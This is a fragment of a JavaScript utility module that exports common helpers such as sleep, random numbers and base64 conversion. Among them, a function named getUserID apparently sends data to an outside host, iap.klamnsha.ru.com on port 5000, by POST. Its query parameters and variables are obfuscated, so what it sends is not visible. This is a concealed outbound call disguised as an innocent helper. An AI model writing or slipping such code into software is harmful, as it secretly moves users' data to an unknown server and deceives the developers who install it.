...
async function getUserID() {
    await fetch(`http://iap.klamnsha.ru.com:5000/?asduihnvas=${sdadgshagdhas}&snuhvda=${sadasdsapp}`, {
        method: 'POST'
...
export { getRandomInt, sleep, listenForAll, createTask, getUserID, withTimeout, readFileFromURL, formatNum, normalize, extractAmount, ObjectSet, UTF8ToBase64, base64ToUTF8 };
